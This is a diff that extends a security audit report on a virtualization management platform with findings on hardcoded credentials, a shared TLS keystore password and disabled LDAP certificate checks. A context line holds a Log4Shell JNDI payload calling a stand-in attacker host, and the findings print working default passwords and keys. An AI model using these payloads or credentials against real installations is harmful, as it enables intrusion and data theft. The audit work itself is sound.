@@ -335,3 +335,87 @@ User-Agent: ${jndi:ldap://attacker.com:1389/Exploit}
 The CIC server runs with the same Tomcat/JVM as the CAS web applications. Successful exploitation gives the attacker full control of the CIC management console server, which typically has network access to all CVK hypervisors and the PostgreSQL database.
 
 **Remediation:** Replace log4j-core-2.7.jar with version 2.18.0 (or >= 2.17.1). The CVM server already uses the patched version.
+
+---
+
+## ZD-015: Tomcat JDBC Resource — Plaintext MySQL Password
+**File:** `remaining_docs/cas_configs/front_package/tomcat_tomcat_context.xml:32`
+**CWE:** CWE-256 (Plaintext Storage of a Password)
+**Severity:** HIGH (CVSS 7.5)
+
+```xml
+<Resource auth="Container" driverClassName="com.mysql.jdbc.Driver" 
+    maxActive="50" maxIdle="3" maxWait="30"
+    name="jdbc/vmaDB" password="1q2w3e" type="javax.sql.DataSource"
+    url="jdbc:mysql://localhost:3306/vms?autoReconnect=false" 
+    username="vservice"/>
+```
+
+**Description:** The Tomcat context.xml contains a plaintext MySQL password `1q2w3e` for user `vservice` accessing database `vms` on localhost. Anyone with filesystem access to the Tomcat server (or who exploits Log4Shell on CIC) can read this password and gain full access to the VM management database.
+
+---
+
+## ZD-016: Tomcat SSL Keystore Password `h3cbj2013` — Same Across All Servers
+**File:** `remaining_docs/cas_configs/front_package/tomcat_tomcat_server.xml:95`
+**CWE:** CWE-321 (Hardcoded Cryptographic Key)
+**Severity:** HIGH (CVSS 7.4)
+
+```xml
+<Connector port="8443" protocol="org.apache.coyote.http11.Http11NioProtocol"
+    maxThreads="150" SSLEnabled="true" scheme="https" secure="true"
+    clientAuth="false" sslProtocol="TLS" sslEnabledProtocols="TLSv1.2"
+    keystoreFile="/var/lib/tomcat/security/keystore"
+    keystorePass="h3cbj2013" />
+```
+
+**Description:** Both CIC and SSV Tomcat servers use the same hardcoded keystore password `h3cbj2013` to protect the TLS certificate private key. If an attacker gains access to the keystore file (e.g., via path traversal or backup exfiltration), they can extract the private key and:
+- Decrypt all TLS traffic to the CAS management console
+- Impersonate the CAS server (MITM attacks)
+- Decrypt captured sessions
+
+---
+
+## ZD-017: LDAP TLS Certificate Verification Disabled
+**File:** `cas-java-decompiled/vmc/sources/com/virtual/plat/server/operator/auth/UserAuthLdapImpl.java:44`
+**CWE:** CWE-295 (Improper Certificate Validation)
+**Severity:** HIGH (CVSS 7.4)
+
+```java
+System.setProperty("com.sun.jndi.ldap.object.disableEndpointIdentification", "true");
+```
+
+**Description:** LDAP authentication disables TLS endpoint identification. This allows MITM attacks on LDAP over TLS connections. An attacker on the network path between CAS and the LDAP server can intercept, modify, or replay LDAP authentication traffic, potentially capturing credentials or injecting malicious results.
+
+---
+
+## ZD-018: RabbitMQ Administrator Credentials Hardcoded in Init Script
+**File:** `extras/front.package/firstboot/rabbitmq/rabbitmq-init.sh`
+**CWE:** CWE-798 (Hardcoded Credentials)
+**Severity:** HIGH (CVSS 7.8)
+
+```bash
+USERNAME="cloud"
+PASSWORD="Cl@oud13"
+VHOST_NAME="cloudMsgHost"
+
+rabbitmqctl add_user $USERNAME $PASSWORD
+rabbitmqctl set_user_tags $USERNAME administrator
+rabbitmqctl set_permissions -p / $USERNAME '.*' '.*' '.*'
+rabbitmqctl change_password guest $PASSWORD
+```
+
+**Description:** RabbitMQ is initialized with hardcoded credentials `cloud:Cl@oud13` with administrator privileges. The `guest` user password is also changed to `Cl@oud13`. The user has full permissions (`'.*'`) on both the default vhost and `cloudMsgHost`. Since RabbitMQ handles message queuing for the entire CAS platform (async tasks, events, alarms), compromise gives full access to internal event bus.
+
+---
+
+## ZD-019: DES Encryption Key Passed on Command Line (Process List Exposure)
+**File:** `extras/front.package/database/db-auth.sh:19-21,116`
+**CWE:** CWE-214 (Invocation of Process Using Visible Sensitive Information)
+**Severity:** MEDIUM (CVSS 5.5)
+
+```bash
+CRYPT_KEY=$(for ((i=0;i<${#IN_SEC};i++)); do printf %02X \'${IN_SEC:$i:1}; done)
+openssl enc -d -des-ecb -K $CRYPT_KEY -nosalt -a
+```
+
+**Description:** The database auth script accepts the DES encryption key via `-k` command-line argument. The key is then used to decrypt database credentials. Command-line arguments are visible in `/proc/*/cmdline` and `ps aux` output. Any user on the CVK host can see the encryption key when the script runs. Combined with the hardcoded key `hzcdbjz01500` from Java source, this provides full database credential disclosure.
